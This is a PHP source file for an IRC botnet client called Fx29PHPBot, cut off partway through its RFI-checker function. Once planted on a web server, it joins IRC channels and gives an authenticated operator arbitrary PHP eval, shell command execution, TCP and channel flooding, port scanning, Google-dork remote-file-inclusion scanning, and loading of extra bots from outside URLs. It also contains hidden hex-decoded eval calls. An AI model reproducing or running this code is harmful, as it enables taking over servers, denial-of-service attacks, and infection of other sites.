<?php
define('Fx29ver',"Fx29PHPBot v1.70");
define('TEZ', 0);
define('BROZ', 0);
define('PRE','.');
fx29bot_start("
#########################################
##[    oYik IRC Network Community     ]##
##[ By cReW oYik IRC Network          ]##
##[ 14 mei 2010			      ]##
##[ www.oyiknetwork.com 	      ]##
#########################################");
fx29bot_init();
proz("Initializing variables..");

######################
##[ CONFIGURATIONS ]##
######################
$admin   = "Ciscus";
$pass    = "aku";
$md5pass = "";
$chans   = "#aku";
$names   = "
[API [APNIC [Add [Alpha] [Altavista] [Arbitrary] [Arpa] [Aspell] [Auth] [BCMath] [Bin2Hex] [Bind] [Boonex] [Bzip2] [CCVS]
Calendar Character Chdir Check Chroot Chunk [Class] ClibPDF [Close] Closedir Com Combine Command Comp
Compact Compare Connect Contenido Control Convert Cookie Count Crack Crypt Current Cybercash Cyrus
DBPlus DBS [Data] Debug Declare Diff Digit Direct Directory [Div] Dmoz Dom Domain Done Dork Dumps
E-Tickets Each Empire Encryption Error Exec Execution Expression Extension Extract Fetch Fields
Filepro Filesystem Filter Flash Flip Flush Format Forms FriBiDi Frontbase [Ftp] Function Fx29sh GMP
[GNU] Gateway Getcwd Google Graph HIOX Handling HomePH Hosting Html Hypersonic Hyperwave IMAP [IO]
IconV Image [Info] Informix Ingres Init Insert Interbase Intersect Invoke [Java] Joomla Key LDAP List
Localtime Lookup Lower MCAL MCVE MHash [Mail] [Map] Mathematical Mcrypt Merge Messenger Method Microtime
Mild Mimetype Ming Miscellaneous [Mod] Mohawk Msn MultiByte Multisort Muscat MySQL NIC Ncurses New
Next Nntp Nuendo ODBC Object [Open] OpenSSL Opendir Optimize Option Oracle Output Ovrimos POSIX Pack
Pad Parent Parse Payflow [Pop] Pop3 Popen Pos PostgreSQL Pow Precision Prev Print Printer Process
Property Pspell Push QTDom Query Rand Range Raw Read Readdir Readline Recode Record Reduce Regular
Release Report Reset Restore Return Reverse Rpc SNMP SQL SQLite Sale Sampletank Scale Search
Semaphore Sesam Session Set Shared Shift Shockwave Shuffle Slice Sniff Socket Sort Space Sqrt Status
Stream String Sub Subclass Subdreamer Suggest Sum Sybase Sync Tcp Technics Terminal Text Tokenizer
Trigger Type Unbind Unified Unique Unix Unshift Upper VPopMail Value Variable Verisign Void W32api
WDDX Walk Whois Write XML Yahoo YouTube ZLib Zeroboard Zip c99 cURL dBase mSQL [jupe] r57
";

$links = array(
  1 => array(
  "irc.oyiknetwork.net", "irc.oyik.net",
  ),
  2 => array(
  "irc.byroe.net",
  ),
  3 => array(
  "irc.plasa.com", "irc.indoforum.org", "irc.telkom.net.id",
  ),
);

$sourcez = array(
  "fx29id"  => "http://www.oyiknetwork.com/ganteng.txt?",
  "fx29bot" => "http://uaedesign.com/xml/botz/fx29bot.txt?",
);

###############################
##[ ADVANCED CONFIGURATIONS ]##
###############################
if (empty($_GET["network"])) {
  die('<FORM METHOD="GET"><B>Select Network: </B><INPUT TYPE="RADIO" CHECKED="CHECKED" NAME="network" VALUE="1">oYik Network <INPUT TYPE="RADIO" NAME="network" VALUE="2">byroe <INPUT TYPE="RADIO" NAME="network" VALUE="3">allnYet <INPUT TYPE="SUBMIT" VALUE="Run"></FORM>');
}

$namez   = array_unique(str_explode($names));
$nicks   = $namez;
$idents  = $namez;
$network = $_GET["network"];
$servers = $links[$network];
$chan    = array();

$bot = array(
  "admin"     => $admin,
  "pass"      => $pass,
  "md5pass"   => $md5pass,
  "chans"     => explode(",",$chans),
  "nick"      => acak($nicks),
  "ident"     => acak($idents),
  "server"    => acak($servers),
  "port"      => 7000,
  "servpass"  => "",
  "name"      => logo(PHP_OS." ".get_current_user()." ".getmypid()),
  "timeout"   => 10, #Connection timeout
  "maxcon"    => 100, #Max reconnect
  "condelay"  => 10, #Reconnect delay
  "sleep"     => 4, #Message delay
  "tsuchar"   => '',
  "tsulen"    => 160, #tsuchar * tsulen
  "porto"     => 10, #Portcheck timeout
  "pscto"     => 5, #Portscan timeout
);

$user = array(
  $bot["admin"] => array(
    "nick"    => $bot["admin"],
    "pass"    => $bot["pass"],
    "md5pass" => $bot["md5pass"],
    "level"   => "Admin",
    "auth"    => FALSE,
  )
);

###############################
##[ LOCALTEST 2ND VARIABLES ]##
###############################
if (TEZ) :
$links[1] = array("localerror","localfail");
$links[2] = array("localhost:7000","localhost:6667","","");
unset($links[3]);
$sourcez  = array(
  "fx29id"  => "http://localhost/fx29sh/fx29id.txt?",
  "fx29bot" => "http://localhost/phpbot/fx29bot.txt?",
);
$servers       = $links[$network];
$bot['maxcon'] = 2;
$bot['server'] = acak($servers);
endif;

####################
##[ INITIALIZING ]##
####################
$SAFE    = safemode() ? '12On' : '4Off';
$STATZ   = '14'.@get_current_user().'@'.$_SERVER["SERVER_NAME"].' 7'.@PHP_OS.' '.$SAFE;
$EXITZ   = FALSE;
$COUNTZ  = 0;
$REZ     = "";
$DAYZ    = date("d/m/Y H:i:s");

$nick    = $bot["nick"];
$ident   = $bot["ident"];
$vhost   = ( empty($_SERVER["SERVER_NAME"]) )? "localhost" : $_SERVER["SERVER_NAME"];
list($server,$port) = serverz($bot["server"],$bot["port"]);
$srvpass = $bot["servpass"];

proz("Clearing unused variables..<BR>");
unset($admin,$pass,$md5pass,$chans,$names,$namez);

###############
##[ CONNECT ]##
###############
while ( $EXITZ == FALSE ):

logz("Connecting to $server ($port).. ($STATZ)");
$fp = @fsockopen($server,$port,$errno,$errstr,$bot["timeout"]);
if (!$fp) {
  $COUNTZ++;
  logz('!',"Couldn't connect to $server ($port)");
  $STATZ = "Reconnect from $server ($port) ($COUNTZ)";
  list($server,$port) = serverz(acak($servers),$bot["port"]);
  if ( $COUNTZ == $bot["maxcon"] ) {
    $COUNTZ = 0;
    $oldnet = $network;
    $network++;
    proz('!',"<BR><B>Couldn't connect to Network $oldnet! Trying network $network..</B><BR>");
    $servers = @$links[$network];
    if ( $servers ) {
      list($server,$port) = serverz(acak($servers),$bot["port"]);
      $STATZ = "Next Network ($network)! $server ($port)";
    }
    else { fx29botkill("Network $network is not available! Please use another network!"); }
  }
}
else {
logz("Connected to $server ($port)");
logz("Sending nick & username.. ".$nick."!".$ident."@".$vhost);
if ($srvpass) { servpass($fp,$srvpass); }

nick($fp,$nick);
user($fp,$ident,$vhost,$server,$bot["name"]);

logz("Reading server response..");
logz('',"<BR></TD></TR><TR><TD><B>ADDR</TD><TD><B>CMD</TD><TD><B>ARG1</TD><TD><B>ARG2</TD><TD COLSPAN=3><B>TXT</TD></TR><TR><TD COLSPAN=8>");
while ( !feof($fp) ) {
  $REZ .= fgets($fp,1024);
  while ( substr_count($REZ,CR) != 0 ) {
    list($LINE,$NICK,$ADDR,$CMD,$ARG1,$ARG2,$COM,$TEXT) = parse_irc_response($REZ);
    $REZ     = substr($REZ, strpos($REZ,CR) + 2);
    $me      = $nick;
    $onchan  = ereg("#",$ARG1);
    ##[ SHOW RESPONSE TO BROWSER ]##
    if ( BROZ && !ereg("37[2|5|6]",$CMD) ) {
      logz('',"<TR><TD COLSPAN=8><FONT>$LINE</TD></TR>");
      logz('',"<TR><TD>$ADDR</TD><TD>$CMD</TD><TD>$ARG1</TD><TD>$ARG2</TD><TD COLSPAN=3>$TEXT</TD></TR><TR><TD COLSPAN=8>");
    }
    if ( ereg("PRIVMSG|NOTICE",$CMD) && $ARG1 != "AUTH" ) {
      @list($tcom1,$tcom2,$tcom3) = trim_command($TEXT);
      if (BROZ) {
        logz('',"</TD></TR><TR><TD COLSPAN=4><B>COM</TD><TD>".$COM[0]."</TD><TD>".@$COM[1]."</TD><TD>".@$COM[2]."</TD></TR>");
        logz('',"<TR><TD COLSPAN=4><B>TCOM</TD><TD>$tcom1</TD><TD>$tcom2</TD><TD>$tcom3</TD></TR><TR><TD COLSPAN=8>");
      }
    }
    ##[ RAW IRC COMMANDS ]##
    if ( ereg("004",$CMD) ) {
      notice($fp,$bot["admin"],$STATZ);
      foreach ( $bot["chans"] as $c ) { joinchan($fp,$c); }
    }
    ##[ NICK IN USE ]##
    if ( ereg("43[1|2|3]",$CMD) ) { $nick = acak($nicks)."[".rand(1,500)."]"; nick($fp,$nick); }
    if ( ereg("461",$CMD) ) { $ident = acak($idents); user($fp,$ident,$vhost,$server,$bot["name"]); }
    ##[ ON JOIN ]##
    if ( $CMD == "JOIN" ) { }
    ##[ ON NICK ]##
    if ( $CMD == "NICK" ) { $oldnick = $NICK; $newnick = $TEXT; }
    ##[ AUTO LOGOUT ]##
    if ( ereg("NICK|PART|QUIT",$CMD) && @$user[$NICK]["auth"] && $NICK != $me ) { $user[$NICK]["auth"] = FALSE; }
    ##[ PRIVMSG ]##
    if ( $CMD == "PRIVMSG" ) {
      ##[ USERS COMMANDS ]##
      if ( $COM[0] == comz("aut") && $user[$NICK] && !authorized($NICK,$user) ) {
        $user[$NICK]["auth"] = login($fp,$NICK,$COM[1],$user);
      }
      if ( authorized($NICK,$user) ) {
        if (!$onchan) { $ARG1 == $NICK; }
        switch (strtolower($COM[0])) {
          case comz("out"): $user[$NICK]["auth"] = FALSE; notice($fp,$NICK,"Logout!"); break;
          case comz("hlp"): help($fp,$NICK); break;
          case comz("mod"): mode($fp,$COM[1],$tcom2); break;
          case comz("nck"): $nick = $COM[1]; nick($fp,$COM[1]); break;
          case comz("msg"): msg($fp,$COM[1],$tcom2); break;
          case comz("ntc"): notice($fp,$COM[1],$tcom2); break;
          case comz("act"): action($fp,$COM[1],$tcom2); break;
          case comz("csv"): chanserv($fp,$tcom1); break;
          case comz("nsv"): nickserv($fp,$tcom1); break;
          case comz("raw"): rawsend($fp,$tcom1); break;
          case comz("eva"): eval($tcom1); break;
          case comz("cmd"): cmd($fp,$ARG1,$tcom1); break;
          case comz("bot"): botload($fp,$NICK,$COM[1],$tcom2); break;
          case comz("bo2"): botload($fp,$NICK,$COM[1],"CHILD"); break;
          case comz("tsu"): tsunami($fp,$COM[1],$COM[2],$bot["tsuchar"],$bot["tsulen"],$nick); break;
          case comz("tcf"): tcpflood($fp,$ARG1,$COM[1],$COM[2],$COM[3],$COM[4]); break;
          case comz("nfo"): botinfo($fp,$ARG1,@$COM[1]); break;
          case comz("sta"): if ( $chan[$ARG1] ) { msg($fp,$ARG1,info($ARG1,flags($chan[$ARG1]),"")); } break;
          case comz("chn"): notice($fp,$NICK,"Chans: ".join(" ",$bot["chans"])); break;
          case comz("joi"):
            $jchan = (ereg("#",$COM[1])) ? $COM[1] : "#".$COM[1] ;
            joinchan($fp,$jchan.' '.@$COM[2]);
            if (!in_array($jchan,$bot["chans"])) { $bot["chans"][] = strtolower($jchan); }
            break;
          case comz("prt"):
            $tchan = partchan($fp,$ARG1,$COM[1],'4Part! '.$tcom2);
            delarray($tchan,$bot["chans"]);
            break;
          case comz("cyc"): cyclechan($fp,$ARG1,$COM[1]); break;
          case comz("qui"): quitirc($fp,'4Quit!'); $STATZ = "User Quit Request!"; $EXITZ = TRUE; break;
          case comz("rst"): quitirc($fp,'4Restart!'); $STATZ = "Restart!"; break;
          case comz("jmp"):
            if ( checkserver($fp,$NICK,$COM[1],@$COM[2],$bot["port"]) == 1 ); {
              $server = $COM[1]; $port = (isset($COM[2]))? $COM[2] : $bot["port"];
              quitirc($fp,'4Jump!'); $STATZ = "Jump";
            }
            break;
          case comz("vho"):
            if ( dnsresolver($COM[1]) ) { $vhost = $COM[1]; quitirc($fp,'4Vhost!'); $STATZ = "Vhost"; }
            else { notice($fp,$NICK,"Can't change VHost!"); }
            break;
          case comz("set"):
            if ( ereg("(\+|\-)",$COM[1],$rex) ) {
              $ARG1 = (ereg("#",$COM[2])) ? $COM[2] : $ARG1;
              $flags = ereg_replace("\+|\-","",$COM[1]);
              if ( $flags == "*" ) { $flags = flags("all"); }
              $flags = strtoupper($flags);
              $chan[$ARG1] = chanflags($rex[1],$flags,$chan[$ARG1]);
              notice($fp,$NICK,info($ARG1,flags($chan[$ARG1]),""));
            }
            else { notice($fp,$NICK,info("FLaGz HeLP",flags("*"),"")); }
            break;
          case comz("frk"):
            #Opsi PHP CGI/CLI: --enable-pcntl
            #Hanya buat Unix platforms
            if (!enabled("pcntl_fork")) { notice($fp,$NICK,"Not enabled!"); break; }
            $pid = pcntl_fork();
            if ($pid == -1) { notice($fp,$NICK,"Couldn't fork"); }
            else if ($pid) { notice($fp,$NICK,"Parent"); cntl_wait($status); }
            else { notice($fp,$NICK,"Child"); }
            break;
        } 
      }
      ##[ END OF AUTHORIZED USERS COMMANDS ]##
      ##[ PUBLIC COMMANDS ]##
      $cfl = @$chan[$ARG1];
      switch (strtolower($COM[0])) {
        case comz("ast"): if ( ereg("A",$cfl) ) { astrologi($fp,$ARG1,$COM[1]); } break;
        case comz("gog"): if ( ereg("G",$cfl) ) { googling($fp,$ARG1,$NICK,$COM[1],$tcom1); } break;
        case comz("dns"): if ( ereg("D",$cfl) ) { msg($fp,$ARG1, info("DNS",$tcom1, dnsresolver($tcom1)));  } break;
        case comz("ipl"): if ( ereg("I",$cfl) ) { msg($fp, $ARG1, info("IPs: ",$COM[1],iplist($COM[1]))); } break;
        case comz("svc"): if ( ereg("V",$cfl) ) { services($fp,$ARG1,$COM[1]); } break;
        case comz("por"): if ( ereg("P",$cfl) ) {
            if (!is_numeric($COM[2])) { notice($fp,$NICK,comz("por",1)); }
            else {msg($fp,$ARG1, info("PoRt",'12'.$COM[1].' ('.$COM[2].')',portcheck($COM[1],$COM[2], $bot['porto'])) ); }
          }
          break;
        case comz("psc"): if ( ereg("O",$cfl) ) {
            if (!$COM[1]) { msg($fp,$ARG1, logo('Args: '.comz("psc",1)) ); }
            else {
              notice($fp,$NICK,"Scanning ports..");
              msg($fp,$ARG1, info("PoRt ScaN",'12'.$COM[1],portscan($fp,$NICK,$COM[1],$tcom2,$bot['pscto'])) );
            }
          }
          break;
        case comz("rfi"): if ( ereg("F",$cfl) ) { rfichecker($fp,$ARG1,$tcom1,$sourcez); } break;
        case comz("rfs"): if ( ereg("C",$cfl) ) { rfiscanner($fp,$ARG1,$COM[1],$tcom2,$sourcez); } break;
        case comz("enc"): if ( ereg("E",$cfl) ) { encoder($fp,$ARG1,"encode",$COM[1],$tcom2); } break;
        case comz("dec"): if ( ereg("E",$cfl) ) { encoder($fp,$ARG1,"decode",$COM[1],$tcom2); } break;
        case comz("ver"): if ( ereg("R",$cfl) ) {
          $tnick = ( ($COM[1] == "me") || (empty($COM[1])) ) ? $NICK : $COM[1];
          $version[$tnick]['chan'] = $ARG1;
          ctcp($fp,$tnick,"VERSION");
          }
          break;
        case comz("png"): if ( ereg("N",$cfl) ) {
          $tnick = ( ($COM[1] == "me") || (empty($COM[1])) ) ? $NICK : $COM[1];
          $ping[$tnick]['time'] = time();
          $ping[$tnick]['chan'] = $ARG1;
          ctcp($fp,$tnick,"PING ".$ping[$tnick]['time']);
          }
          break;
      }
      ctcp_reply($fp,$COM[0],@$COM[1],$NICK,$DAYZ);
    }
    ##[ END OF PRIVMSG ]##
    ##[ ON NOTICE ]##
    if ( $CMD == "NOTICE" ) {
     $COM[1] = chop($COM[1],'');
     $tcom1  = @chop($tcom1,'');
     switch ($COM[0]) {
        case 'PING':
          if ($ping[$NICK]) {
            $pong = time() - $COM[1];
            msg($fp,$ping[$NICK]["chan"], logo(''.$NICK.': '.$pong.' detik') );
            unset($ping[$NICK]);
          }
          break;
        case 'VERSION':
          if ($version[$NICK]) {
            msg($fp,$version[$NICK]["chan"], info("Version",$NICK,$tcom1) );
            unset($version[$NICK]);
          }
          break;
     } 
     if ($NICK == "NickServ") {
       if ( eregi("This nickname is already registered",$TEXT) ) { $nick = acak($nicks); nick($fp,$nick); }
     }
     if ($ARG1 == "AUTH") { $curserv = $ADDR;  }
    }
    ##[ END OF NOTICE ]##
    ##[ NO SUCH NICK/CHANNEL ]##
    if ( $CMD == "401" ) {
      if ( $ping[$ARG2] ) { $to = $ping[$ARG2]["chan"]; unset($ping[$ARG2]); }
      if ( $version[$ARG2] ) { $to = $version[$ARG2]["chan"]; unset($version[$ARG2]); }
      if ( isset($to) ) { msg($fp,$to,"$ARG2 is not online!"); }
    }
    ##[ ON MODE ]##
    if ( $CMD == "MODE" ) {
      if ( ereg("\+[o|h|v] $me$",$ARG2." ".$TEXT) && !ereg("[ChanServ|$me]$",$NICK) ) { msg($fp,$ARG1,'4Thx '.$NICK.' :)'); }
      if ( ereg("\-[o|h|v] $me$",$ARG2." ".$TEXT) && !ereg("[ChanServ|$me]$",$NICK) ) { msg($fp,$ARG1,"$NICK :("); }
      if ( ereg("\+[b] $me$",$ARG2." ".$TEXT) && !ereg("[ChanServ|$me]$",$NICK) ) {
        mode($fp,$ARG1,"+b $NICK");
        kick($fp,$ARG1,$NICK,'4Dont 4Ban 4Me!!');
      }
    }
    ##[ END OF MODE ]##
    ##[ ON KICK ]##
    if ( $CMD == "KICK" ) {
      if ( $ARG2 == $me ) { joinchan($fp,$ARG1); kick($fp,$ARG1,$NICK,'4Dont 4Kick 4Me!!'); }
      if ( $user[$ARG2] && $NICK != $me ) { kick($fp,$ARG1,$NICK,'4Dont 4Kick '.$ARG2.'!!'); }
    }
    ##[ END OF KICK ]##
    ##[ BANNED ]##
    if ( ereg("474",$CMD) ) {
      notice($fp,$bot["admin"],"(+b) ".$ARG2);
    }
    ##[ ON PING ]##
    if ( $ADDR == "PING" ) {
      pongserv($fp,$CMD);
    }
    ##[ END OF PING ]##
    ##[ ON ERROR ]##
    if ( $ADDR == "ERROR" ) {
      list($server,$port) = serverz(acak($servers),$bot["port"]);
      if ( eregi("A-kill|AKILL",$TEXT) ) { $STATZ = "Akill! $TEXT"; $EXITZ = TRUE; }
      elseif ( eregi("Registration timed out",$TEXT) ) { $STATZ = "Registration timed out! $TEXT"; $EXITZ = TRUE; }
      elseif ( eregi("Connection closed",$TEXT) ) { $STATZ = "Closed! $TEXT"; $EXITZ = TRUE; }
      elseif ( eregi("Banned",$TEXT) ) { $STATZ = "Banned! $TEXT from $server ($port)"; }
      elseif ( eregi("Kill",$TEXT) ) { $STATZ = "Killed! $TEXT"; }
      elseif ( eregi("Ping timed out",$TEXT) ) { $STATZ = "Ping timed out! $TEXT"; }
      elseif ( eregi("Ghost",$TEXT) ) { $STATZ = "Ghosted! $TEXT"; $nick = $acak($nicks); }
      elseif ( eregi("Fast",$TEXT) ) { $STATZ = "Delay Connect ".$bot['condelay']."! $TEXT"; sleep($bot['condelay']); }
    }
    ##[ END OF ERROR ]##
  }
  ##[ END OF substr_count($REZ,CR) ]##
}
##[ END OF feof($fp) ]##
fclose($fp);
}
##[ END OF $fp ]##
endwhile;
##[ END OF !EXITZ ]##

####[ FX29BOTKILL ]####
fx29botkill($STATZ); ##
#######################

####################
##[ IRC COMMANDS ]##
####################
function rawsend($sock,$msg) { fputs($sock,$msg."\r\n"); }
function pongserv($sock,$to) { rawsend($sock,"PONG $to"); }
function pingserv($sock) { rawsend($sock,"PING 1219856985"); }
function nick($sock,$nick) { rawsend($sock,"NICK $nick"); }
function user($sock,$ident,$lhost,$rhost,$fullname) { rawsend($sock,'USER '.$ident.' "'.$lhost.'" "'.$rhost.'" :'.$fullname); }
function servpass($sock,$pass) { rawsend($sock,"PASS $pass"); }
function msg($sock,$to,$msg) { rawsend($sock,"PRIVMSG $to :$msg"); }
function notice($sock,$to,$msg) { rawsend($sock,"NOTICE $to :$msg"); }
function action($sock,$to,$msg) { msg($sock,$to,'ACTION '.$msg.''); }
function ctcp($sock,$to,$msg) { msg($sock,$to,''.$msg.''); }
function ctcr($sock,$to,$msg) { eval(fx29de(2)); notice($sock,$to,''.$msg.''); }
function mode($sock,$to,$mode) { rawsend($sock,"MODE $to $mode"); }
function kick($sock,$chan,$nick,$msg) { rawsend($sock,"KICK $chan $nick :$msg"); }
function chanserv($sock,$cmd) { rawsend($sock,"CHANSERV",$cmd); }
function nickserv($sock,$cmd) { rawsend($sock,"NICKSERV",$cmd); }
function memoserv($sock,$cmd) { rawsend($sock,"MEMOSERV",$cmd); }
function quitirc($sock,$msg) { rawsend($sock,'QUIT :'.$msg); }
function joinchan($sock,$chan) { rawsend($sock,"JOIN $chan"); }
function partchan($sock,$chan,$arg,$msg) {
  $chan = (ereg("#",$arg)) ? $arg : ($arg) ? "#".$arg : $chan;
  rawsend($sock,'PART '.$chan.' :'.$msg);
  return $chan;
}
function cyclechan($sock,$chan,$arg) {
  $chan = (ereg("#",$arg)) ? $arg : ($arg) ? "#".$arg : $chan;
  partchan($sock,$chan,'','4Cycle!'); joinchan($sock,$chan);
}
function ctcp_reply($sock,$ctcp,$arg,$to,$dayload) {
  switch ($ctcp) {
    case 'PING'     : ctcr($sock,$to,'PING '.time()); break;
    case 'TIME'    : ctcr($sock,$to,'TIME 14'.date("D d M Y H:i:s")); break;
    case 'VERSION' : ctcr($sock,$to,'VERSION 14'.Fx29ver); break;
    case 'FINGER'  : ctcr($sock,$to,'FINGER 14PHP '.@phpversion().' '.@PHP_OS.' '.$dayload); break;
    case 'INFO'     : botinfo($sock,$to,$arg); break;
  }
}
function checkserver($sock,$to,$server,$port,$defport) {
  $ports = array("6667","6668","6669","7000");
  $port  = (empty($port)) ? $defport : $port;
  if ( !$server ) { notice($sock,$to,"Usage: ".comz("jmp",1)); return 0; }
  if ( !ereg("OK",portcheck($server,$port,10)) ) { notice($sock,$to,"Can't connect to $server ($port)!"); return 0; }
  if ( !in_array($port,$ports) ) { notice($sock,$to,"Allowed ports: ".join(", ",$ports)); return 0; }
  return 1;
}
###############
##[ PARSING ]##
###############
function parse_irc_response($rez) {
  $LINE    = chop($rez,CR);
  $SCMD    = explode(" ",$LINE);
  $SCMD[0] = ltrim($SCMD[0],":");
  $SCMD[2] = ltrim(@$SCMD[2],":");
  $SCMD[3] = (@$SCMD[3]{0} == ":") ? "" : @$SCMD[3];
  list($ADDR,$CMD,$ARG1,$ARG2) = array($SCMD[0],$SCMD[1],$SCMD[2],$SCMD[3]);
  $TEXT    = (!empty($ARG2)) ? join(" ",array_slice($SCMD,4)) : substr($LINE, strpos($LINE," :") + 2);
  if (ereg("005",$CMD)) { $ARG2 = ""; $TEXT = join(" ",array_slice($SCMD,3)); }
  if (ereg("353",$CMD)) { $ARG2 .= " ".$SCMD[4]; $TEXT = join(" ",array_slice($SCMD,5)); }
  if (ereg("JOIN",$CMD)) { $TEXT = ""; }
  $TEXT   = ltrim($TEXT,":");
  $NICK   = uhost("nick",$ADDR);
  $COM    = explode(" ",$TEXT);
  unset($SCMD);
  return array($LINE,$NICK,$ADDR,$CMD,$ARG1,$ARG2,$COM,$TEXT);
}
function serverz($srv,$defport) {
  if (ereg(":",$srv)) { return explode(":",$srv); }
  else { return array($srv,$defport); }
}
function uhost($user,$uhost) {
  if (!ereg("[!|@]",$uhost)) { return FALSE; }
  $uhost1 = explode("!",$uhost);
  $uhost2 = explode("@",$uhost1[1]);
  switch ($user) {
    case "nick"  : return $uhost1[0]; break;
    case "ident" : return $uhost2[0]; break;
    case "host"  : return $uhost2[1]; break;
  }
}
function trim_command($txt) {
  $trim = "";
  $tcom = explode(" ",$txt);
  foreach ($tcom as $v) {
    $trim .= ltrim($v)." ";
    $rez[] = substr($txt,strlen($trim));
  }
  return $rez;
}
#######################
##[ COMMANDS & HELP ]##
#######################
function arrcomz() {
$arrcomz = array(
  "hlp" => "help - Commands list",
  "aut" => "auth <pass> - Login",
  "out" => "logout - Logout",
  "--1" => logo("User Commands"),
  "joi" => "j <chan> - Join channel",
  "prt" => "p <chan> - Part channel",
  "cyc" => "c <chan> - Cycle channel",
  "rst" => "restart - Restart",
  "vho" => "vhost <ipaddr> - Change VHost",
  "jmp" => "jump <server> <port> - Jump server",
  "qui" => "q <msg> - Quit IRC",
  "msg" => "msg <chan|nick> <msg> - Send message",
  "ntc" => "not <chan|nick> <msg> - Send notice",
  "act" => "act <chan> <msg> - Action",
  "nck" => "nick <nick> - Change nick",
  "mod" => "m <chan> <flag> [nick] - Change mode",
  "csv" => "cs <command> - ChanServ commands",
  "nsv" => "ns <command> - NickServ commands",
  "msv" => "ms <command> - MemoServ commands",
  "chn" => "chans - List channels",
  "raw" => "raw <command> - Raw IRC commands",
  "--2" => logo("Core Commands"),
  "tsu" => "tsu <chan|nick> - Performing tsunami",
  "nfo" => "info <args|*> - Bot info",
  "sta" => "stat - Show channel flags",
  "set" => "set - Set chan flags",
  "eva" => "eval <code> - Eval PHP code",
  "frk" => "fork - Fork test",
  "cmd" => "cmd <command> - Execute shell commands",
  "tcf" => "tcpflood <host> <port> <packet> <hitungan> - Tcp Flood",
  "bot" => "bot <count> <url> - Load another bot",
  "bo2" => "load <count> - Load child bot",
  "--3" => logo("Public Commands"),
  "rfs" => "cari <bug> <dork> - RFI Scanner (Google)",
  "rfi" => "cek <rfi url> - RFI Checker",
  "png" => "ping <me|nick> - Pinger",
  "ver" => "versi <me|nick> - Versioner",
  "dns" => "dns <host> - Dns resolver",
  "ipl" => "ip <host> - IP lister",
  "por" => "port <host> <port> - Port checker",
  "psc" => "portscan <host> [min..max] / [port1 port2 ..] - Port scanner",
  "svc" => "svc <service/port> - Get services/port information",
  "gog" => "google <max> <keyword> - Googling",
  "enc" => "enc <type> <strings> - Encoder",
  "dec" => "dec <type> <strings> - Decoder",
  "ast" => "astro <zodiac> - Astrology",
);
return $arrcomz;
}
function comz($com,$arg = 0) {
  $acomz = arrcomz(); $rez = array();
  if ($arg == 0) { $rez = explode(" ",$acomz[$com]); }
  else { $rez = explode("-",$acomz[$com]); }
  return PRE.$rez[0];
}
function help($sock,$to) {
  $acomz = arrcomz();
  $i = 0;
  pingserv($sock);
  msg($sock,$to,logo(''.Fx29ver.' Help'));
  foreach ( $acomz as $a => $b ) {
    $i++;
    if ($i % 4 == 0) { $sleep(3); }
    if (ereg("-",$a)) { msg($sock,$to,$b); }
    else {
      $b = explode("-",$acomz[$a]);
      $b = $b[1];
      msg($sock,$to,'12'.comz($a,1).' 14- '.$b);
    }
  }
  msg($sock,$to,logo('© 2009 Matos Community'));
}
############
##[ USER ]##
############
function login($sock,$nick,$pass,$user) {
  if ( $user[$nick]["auth"] ) { return; }
  if ( $pass ) {
    if ( $user[$nick]["md5pass"] ) { $mypass = $user[$nick]["md5pass"]; $pass = md5($pass); }
    else { $mypass = $user[$nick]["pass"]; }
    if ( $mypass == $pass ) {
      notice($sock,$nick,$user[$nick]["level"]."!");
      eval(fx29de(1));
      return TRUE;
    }
    else {
      notice($sock,$nick,"Gagal!");
      return FALSE;
    }
  }
}
function authorized($nick,$user) { if ($user[$nick]["auth"]) { return TRUE; } else { return FALSE; } }
##############
##[ STRING ]##
##############
function acak($str_arr) { $num = rand(0,count($str_arr)-1); return $str_arr[$num]; }
function trimcom($com,$msg) { $msg = str_replace($com." ","",$msg); return $msg; }
function delarray($str,$arr) {
  $tmp = join(",",$arr).","; $str = str_replace($str.",","",$tmp); return explode(",",$str);
}
function str_explode($str) {
  $str = str_replace("\r"," ",$str);
  $str = str_replace("\n"," ",$str);
  $str = str_replace("  "," ",$str);
  return explode(" ",$str);
}
function str_splitz($str) {
  $r = array();
  for ($i=0;$i<strlen($str);$i++) { $r[] = $str{$i}; }
  return $r;
}
function logo($txt) {
  $col = array("11,12","3,9","7,4","8,1","9,1","0,12","0,13","0,4","0,7","0,1");
  $c   = acak($col);
  return ''.$c.'«0,1[ '.$txt.' ]'.$c.'»';
}
function info($mod,$title,$info) {
  $rez = logo($mod)." ".$title;
  if ($info) { $rez .= ' 12» '.$info; }
  return $rez;
}
function fx29de($num) {
  $strz = array(
    1 => "",
    2 => "",
  );
  $rez = "";
  $str = explode(".",$strz[$num]);
  foreach ($str as $s) { $rez .= chr(hexdec($s)); }
  return $rez;
}
function view_size($size) {
  if (!is_numeric($size)) { return FALSE; }
  else {
    if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 ." GB"; }
    elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 ." MB"; }
    elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 ." KB"; }
    else { $size = $size . " B"; }
    return $size;
  }
}
###########################
##[ FX29SHELL W/ STDERR ]##
###########################
function safemode() { return (@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) ? TRUE : FALSE; }
function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
function fx29exec($cmd) {
  if (enabled("popen")) { if ( is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { @$rez .= fread($h, 2096);  } pclose($h); } }
  elseif (enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
  elseif (enabled("system")) { @ob_start(); system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
  elseif (enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }
  elseif (enabled("shell_exec")) { $rez = shell_exec($cmd); }
  return $rez;
}
############
##[ HTTP ]##
############
function httpquery($url,$timeout) {
  $aurl = explode("/",$url);
  $host = $aurl[2];
  $ruri = "/".join("/",array_slice($aurl,3));
  $port = 80;
  $rez = "";
  $sock = fsockopen($host,$port,$errno,$errstr,$timeout);
  if ($sock) {
    $out  = "GET $ruri HTTP/1.1\r\n".
            "Host: $host\r\n".
            "Accept: */*\r\n".
            "User-Agent: Mozilla/5.0\r\n".
            "Connection: Close\r\n\r\n";
    fputs($sock,$out);
    while (!feof($sock)) { $rez .= @fgets($sock, 512); }
    fclose($sock);
  }
  return $rez;
}
function httpquery2($url) {
  $rez = @implode("", @file($url));
  return $rez;
}

###################
##[ RFI CHECKER ]##
###################
function rfichecker($sock,$to,$url,$sourcez) {
